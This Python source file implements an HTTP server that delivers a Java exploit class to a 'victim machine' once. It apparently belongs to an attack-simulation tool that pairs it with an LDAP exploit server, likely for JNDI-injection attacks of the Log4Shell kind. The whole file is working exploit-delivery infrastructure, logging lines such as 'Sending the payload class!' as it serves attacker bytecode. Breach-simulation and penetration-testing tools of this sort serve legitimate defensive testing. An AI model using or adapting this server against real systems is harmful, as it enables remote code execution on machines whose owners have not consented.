import http.server
import logging
import threading

logger = logging.getLogger(__name__)

HTTP_TOO_MANY_REQUESTS_ERROR_CODE = 429


class HTTPHandler(http.server.BaseHTTPRequestHandler):

    java_class: bytes
    class_downloaded: threading.Event

    def do_GET(self):
        if HTTPHandler.class_downloaded.is_set():
            self.send_error(
                HTTP_TOO_MANY_REQUESTS_ERROR_CODE, "Java exploit class has already been downloaded"
            )
            return

        HTTPHandler.class_downloaded.set()
        logger.info("Java class servergot a GET request!")
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()
        logger.info("Sending the payload class!")
        self.wfile.write(self.java_class)


class ExploitClassHTTPServer:
    def __init__(self, ip: str, port: int, java_class: bytes, poll_interval: float = 0.5):
        logger.debug(f"The Java Exploit class will be served at {ip}:{port}")

        self._class_downloaded = threading.Event()
        self._poll_interval = poll_interval

        self._initialize_http_handler(java_class)

        self._server = http.server.HTTPServer((ip, port), HTTPHandler)
        # Setting `daemon=True` to save ourselves some trouble when this is merged to the
        # agent-refactor branch.
        # TODO: Make a call to `create_daemon_thread()` instead of calling the `Thread()`
        # constructor directly after merging to the agent-refactor branch.
        self._server_thread = threading.Thread(
            target=self._server.serve_forever, args=(self._poll_interval,), daemon=True
        )

    def _initialize_http_handler(self, java_class: bytes):
        HTTPHandler.java_class = java_class
        HTTPHandler.class_downloaded = self._class_downloaded

    def run(self):
        logger.info("Starting ExploitClassHTTPServer")
        self._class_downloaded.clear()

        # NOTE: Unlike in LDAPExploitServer, we theoretically don't need to worry about a race
        # between when `serve_forever()` is ready to handle requests and when the victim machine
        # sends its requests. See
        # https://stackoverflow.com/questions/22606480/how-can-i-test-if-python-http-server-httpserver-is-serving-forever
        # for more information.
        self._server_thread.start()

    def stop(self, timeout: float = None):
        if self._server_thread.is_alive():
            logger.debug("Stopping the Java Exploit class HTTP server")
            self._server.shutdown()
            self._server_thread.join(timeout)

        if self._server_thread.is_alive():
            logger.warning("Timed out while waiting for The HTTP exploit server to stop")
        else:
            logger.debug("The Java Exploit class HTTP server has stopped")

    def exploit_class_downloaded(self) -> bool:
        return self._class_downloaded.is_set()
